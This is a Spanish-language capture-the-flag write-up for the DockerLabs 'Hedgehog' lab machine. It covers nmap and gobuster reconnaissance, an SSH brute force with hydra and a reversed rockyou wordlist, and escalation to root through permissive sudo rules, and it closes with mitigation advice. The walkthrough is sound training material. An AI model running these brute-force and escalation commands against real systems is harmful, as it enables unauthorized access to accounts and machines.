# Writeup: Hedgehog

- **Máquina:** Hedgehog (DockerLabs)
- **Enlace:** [https://dockerlabs.es/maquinas/144/descargar](https://dockerlabs.es/maquinas/37/descargar)
- **Dificultad:** Muy Fácil
- **Fecha:** 28 de Octubre 2026

---

## Objetivo
Acceder a privilegios `root` utilizando fuerza bruta y movimiento entre usuarios.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh hedgehog.tar
```
<img width="576" height="360" alt="Captura de pantalla (273)" src="https://github.com/user-attachments/assets/b0f2c062-c699-4a3f-99b2-4e922598b0d6" />

Para comprobar que el server este activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.116 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.070 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.068 ms
3 packets transmitted, 3 received, 0% packet loss, time 2248ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando dos puertos abiertos:

```bash
$ sudo nmap -p- 172.17.0.2 -oN scanhedgehog.txt
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http 
```

Una vez hecho esto, se utilizó `gobuster` para listar directorios ocultos: 
```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt
```

<img width="535" height="161" alt="Captura de pantalla (288)" src="https://github.com/user-attachments/assets/f67421e5-1bca-4870-b76c-493c724a424d" />

No se encontró nada sospechoso. 



--- 

## 2. Identificación de vulnerabilidades
Para ver el contenido de la dirección **http://172.17.0.2/**, se utilizó la herramienta `curl`, lo que devolvió el nombre de un usuario valido: 

```bash
$ curl http://172.17.0.2/ 
```
Resultado:
```bash
tails
```
Visitar **http://172.17.0.2/** en el navegador es otra forma de hacerse con el nombre de ususario **tails**.

Con esta información, es posible pasar a la fase de Explotación.


---
## 3. Explotación
### 1. Ataque de fuerza bruta
El comando básico de `hydra` para para la obtención de crendenciales no da resultado por lo que se invirtió el orden del diccionario.

Copiar e invertir la lista de contraseñas en el directorio actual:

```bash
$ tac /usr/share/wordlists/rockyou.txt > rockyouinv.txt
```

Eliminar los espacios en blanco:

```bash
$ sed -i 's/ //g' rockyouinv.txt
```

Teniendo la nueva lista, se utilizó `hydra`:

```bash
$ hydra -l tails -P rockyouinv.txt ssh://172.17.0.2 
```
Resultado: 

```bash
22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
```

Sabiendo la contraseña, procedemos a conectarnos a la shell **tails** utilizando `ssh`:

```bash
$ ssh tails@172.17.0.2
```
<img width="237" height="54" alt="Captura de pantalla (289)" src="https://github.com/user-attachments/assets/b41703c3-db5f-4dc7-9d35-274909426c44" />



### 2. Escalada de privilegios 
Con `sudo -l`, podemos ver que **tails** tiene permisos acceder a la shell **sonic** sin requerir contraseña: 

```bash
User tails may run the following commands on 5a81b6070ea0:
    (sonic) NOPASSWD: ALL
```

Se utilizó `sudo -u sonic /bin/bash` para acceder a la shell **sonic**.

<img width="318" height="54" alt="Captura de pantalla (290)" src="https://github.com/user-attachments/assets/60b2a3ac-b982-4762-ab70-ef48d31656c4" />

Volvemos a utilizar `sudo -l` y en este caso vemos que **sonic** puede ejecutar cualquier comando desde cualquier usuario:

```bash
User sonic may run the following commands on 5a81b6070ea0:
    (ALL) NOPASSWD: ALL
```

Aprovechamos la vulnerabilidad para acceder a `root`:

```bash
sonic@5a81b6070ea0:/home/tails$ sudo -u root /bin/bash
```

Resultado: 

<img width="326" height="86" alt="Captura de pantalla (291)" src="https://github.com/user-attachments/assets/52b76d7c-6b37-4bcb-b8c8-5feacffed38f" />


---
## Acciones de mitigación
- **Escalada de privilegios**: aplicar principio de menor privilegio o eliminar permisos de ejecución como cualquier usuario.
- **Contraseña débil vulnerable a ataques de fuerza bruta**: aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
- **Divulgar nombre de usuario valido en la web**: no exponer información de cuentas validas en webs públicas.
---
